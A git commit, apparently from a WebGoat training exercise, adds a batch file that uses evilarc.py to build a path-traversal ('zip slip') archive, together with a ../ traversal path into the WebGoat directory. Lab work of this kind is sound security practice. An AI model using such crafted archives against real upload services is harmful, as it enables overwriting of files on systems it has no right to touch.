5d4e3985a8033fa0f6fdfc5d0663c14bb410747e
James-Lu-none <jamesabcde277@gmail.com>
2024-02-01 20:37:11 +0800

    done Path traversal

---
+++ PathTraversal/create_evil_zip.bat
@@ -0,0 +1,2 @@
+python evilarc.py home\webgoat\.webgoat-2023.9-SNAPSHOT\PathTraversal\location\ss.png -d 8
+../../../../../../../../home/webgoat/.webgoat-2023.9-SNAPSHOT/PathTraversal/location/location.jpg
